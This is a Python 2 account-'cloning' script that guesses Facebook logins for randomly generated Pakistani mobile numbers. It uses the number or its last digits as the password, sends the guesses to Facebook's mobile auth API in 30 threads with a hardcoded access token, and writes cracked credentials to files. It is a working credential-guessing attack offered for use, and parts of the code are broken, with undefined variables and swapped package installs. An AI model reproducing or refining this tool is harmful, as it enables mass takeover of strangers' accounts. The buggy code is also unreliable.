
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(30000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 star.py')
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
back = 0
oks = []
id = []
cpb = []
am = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system("clear")
logo = """
\033[1;91m██╗░░██╗░█████╗░███╗░░░███╗██╗██╗
\033[1;92m██║░░██║██╔══██╗████╗░████║██║██║
\033[1;93m███████║███████║██╔████╔██║██║██║
\033[1;94m██╔══██║██╔══██║██║╚██╔╝██║██║██║
\033[1;95m██║░░██║██║░░██║██║░╚═╝░██║██║██║
\033[1;96m╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚═╝
"""
def lisensi():
    os.system('clear')
    login()
def login():
        os.system('clear')
        print logo
        print
        print '\x1b[1;97m   Type\033[1;91m •\033[1;93mZANII\033[1;91m• \033[1;97m Then Start Cloning'
        pilih_Somi()
def pilih_Somi():
    Somi = raw_input("    \n\033[1;95m write ZANII here •➢ \033[1;96m")
    if Somi =="":
        print "    \x1b[1;97mFill In Correctly"
        pilih_login()
    elif Somi =="ZANII":              
        os.system('clear')
        print logo
        print
        print 50* '\033[1;93m•'
        print '    \033[1;93mSELECT SIM CODE \033[1;92mDEVIL HAMII'
        print 50* '\033[1;93m•'
        print
        print '    \033[1;93mJAZZ'
        print '    \033[1;92m00,01,02,03,04,05,06,07,08,09'
        print '    \033[1;93mZONG'
        print '    \033[1;92m11,12,13,14,15,16,17,18'
        print '    \033[1;93mWARID'
        print '    \033[1;92m21,22,23,24'
        print '    \033[1;93mUFONE'
        print '    \033[1;92m30,31,32,33,34,35,36'
        print '    \033[1;93mTELENOR'
        print '    \033[1;92m40,41,42,43,44,45,46,47,48,49'
        print
        try:
            c = raw_input('  PUT HERE SIM CODE  •> ')
            os.system('clear')
            print logo
            k = raw_input('   PUT HERE===>  03==>  ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '[!] File Not Found'
            raw_input('\n    [ Back ]')
            somi()                    
    elif somi == '0':            
            login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;93m•'
    xxx = str(len(id))
    print('\033[1;96m            Total Account : '+xxx)
    print 50* '\033[1;93m•'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m   (ZANII OK💔)\x1b[1;91m  ●   \x1b[1;97m' + k + c + user + '\x1b[1;91m  ● \x1b[1;95m' + pass1                                       
                okb = open('sdcard/ids/successful.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m   (ZANII CP😱\x1b[1;92m)\x1b[1;91m  ●  \x1b[1;97m' + k  + c + user + '\x1b[1;91m  ● \x1b[1;96m ' + pass1
                    cps = open('sdcard/ids/checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m   (ZANII OK💔)\x1b[1;91m  ●   \x1b[1;97m' + k + c + user + '\x1b[1;91m  ● \x1b[1;95m' + pass2                                      
                        okb = open('sdcard/ids/successful.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                 
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m   (ZANII CP😱)\x1b[1;91m  ●  \x1b[1;97m' + k  + c + user + '\x1b[1;91m  ● \x1b[1;96m ' + pass2
                            cps = open('sdcard/ids/checkpoint.txt', 'a')
                            cps.write(k+c+user+pass3+'\n')
                            cps.close()
                            cpb.append(c+user+pass3)                                                                                                                                                                 
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    
    print 50* '\033[1;91m-'
    print '    Process Has Been Completed ...'
    print '    Total Online/Offline : '+str(len(oks))+''+str(len(cpb))
    raw_input("\n\033[1;92m    [\033[1;92mBack\033[1;95m]")
    login() 
if __name__ == '__main__':
	
    login()
